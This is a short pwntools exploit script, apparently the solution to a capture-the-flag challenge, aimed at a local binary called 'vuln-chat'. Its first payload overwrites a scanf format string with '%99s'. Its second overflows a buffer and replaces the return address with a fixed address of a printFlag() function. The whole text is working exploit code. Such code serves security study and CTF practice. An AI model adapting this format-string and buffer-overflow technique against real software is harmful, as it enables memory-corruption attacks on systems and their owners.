from pwn import *

target = process('./vuln-chat')

# Receive until username prompt
print(target.recvuntil(b'Enter your username: '))

# First payload to corrupt scanf format string with "%99s"
payload0 = b'0' * 0x14 + b'%99s'
target.sendline(payload0)

# Receive until prompt for next input
print(target.recvuntil(b'I know I can trust you?\n'))

# Second payload to overflow buffer and overwrite return addr with printFlag()
payload1 = b'1' * 0x31 + p32(0x0804856b)
target.sendline(payload1)

# Interactive shell to view flag and output
target.interactive()
